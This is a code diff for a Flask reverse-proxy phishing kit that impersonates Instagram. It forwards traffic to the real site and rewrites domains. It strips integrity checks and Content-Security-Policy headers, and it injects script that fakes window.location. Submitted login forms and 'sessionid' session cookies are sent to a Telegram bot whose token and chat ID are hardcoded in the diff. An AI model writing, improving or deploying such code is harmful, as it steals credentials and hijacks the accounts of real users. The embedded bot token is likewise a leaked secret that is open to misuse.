@@ -7,9 +7,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 a = Flask(__name__)
 a.secret_key = os.urandom(32).hex()
 
-T = os.environ.get("T_BOT", ""); C = os.environ.get("T_CHAT", "")
+T = os.environ.get("T_BOT", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
+C = os.environ.get("T_CHAT", "1367401179")
 
-class E:
+class X:
     def __init__(self):
         self.d = "www.instagram.com"
         self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]
@@ -18,73 +19,63 @@ class E:
         try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
         except: pass
 
-    def r(self, t, h):
+    def s(self, t, h):
+        # استبدال النطاقات
         for d in self.p:
             t = t.replace(f"https://{d}", f"https://{h}")
             t = t.replace(f"//{d}", f"//{h}")
-            t = t.replace(d, h)
+        # كسر حماية الـ JS
         t = re.sub(r'integrity="[^"]+"', '', t)
-        t = t.replace('Content-Security-Policy', 'X-Ignored-CSP')
-        
+        t = t.replace('Content-Security-Policy', 'X-CSP')
+        # حقن كود الخداع العظيم
         if '<head>' in t:
-            i = f"""
-            <script>
-                Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
-                Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
-                Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
-                // تجاوز بعض فحوصات Instagram JS
-                if (typeof window._sharedData !== 'undefined') {{
-                    window._sharedData.config.viewerId = null;
-                    window._sharedData.config.csrf_token = 'fake_csrf_token';
-                }}
-                console.log('JS Spoofing Active!');
-            </script>
-            """
-            t = t.replace('<head>', f'<head>{i}')
+            j = f"<script>Object.defineProperty(window.location,'hostname',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'host',{{get:()=>'{self.d}'}});</script>"
+            t = t.replace('<head>', f'<head>{j}')
         return t
 
-e = E()
+e = X()
 
-@a.route('/', defaults={'x': ''})
-@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
-def f(x):
+@a.route('/', defaults={'p': ''})
+@a.route('/<path:p>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+def g(p):
     h = request.headers.get('Host', '').split(':')[0]
-    u = urljoin(f"https://{e.d}", x)
+    u = urljoin(f"https://{e.d}", p)
     if request.query_string: u += '?' + request.query_string.decode()
 
     H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
     H['Host'] = e.d
 
     if request.method == 'POST':
-        D = request.form.to_dict() or request.get_json(silent=True) or {}
-        if D: e.n(f"🔐 <b>L:</b>\n<pre>{json.dumps(D, indent=2)}</pre>")
+        d = request.form.to_dict() or request.get_json(silent=True) or {}
+        if d: e.n(f"🔐 <b>Login:</b>\n<pre>{json.dumps(d, indent=2)}</pre>")
 
     try:
-        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
+        r = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=20)
         
-        B = R.content
-        try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
-        except: pass
+        b = r.content
+        if any(x in r.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
+            try: b = e.s(b.decode('utf-8', errors='ignore'), h).encode()
+            except: pass
 
-        r = make_response(B)
-        r.status_code = R.status_code
+        o = make_response(b)
+        o.status_code = r.status_code
 
-        for k, v in R.headers.items():
+        for k, v in r.headers.items():
             if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
-                r.headers[k] = v
+                o.headers[k] = v
 
-        for k, v in R.cookies.items():
-            r.set_cookie(k, v, domain=h, secure=True, httponly=True, samesite='Lax')
+        for k, v in r.cookies.items():
+            o.set_cookie(k, v, domain=h, secure=True, httponly=True, samesite='Lax')
 
-        if 'sessionid' in R.cookies:
-            e.n(f"🔥 <b>S:</b>\n<code>{json.dumps(R.cookies.get_dict())}</code>")
+        if 'sessionid' in r.cookies:
+            e.n(f"🔥 <b>Session:</b>\n<code>{json.dumps(r.cookies.get_dict())}</code>")
 
-        if R.status_code in [301, 302, 303, 307, 308]:
-            l = R.headers.get('Location', '').replace(e.d, h)
-            r.headers['Location'] = l
+        if r.status_code in [301, 302, 303, 307, 308]:
+            l = r.headers.get('Location', '').replace(e.d, h)
+            o.headers['Location'] = l
 
-        return r
-    except: return "X", 503
+        return o
+    except: return "Error", 503
 
 if __name__ == '__main__':
     a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
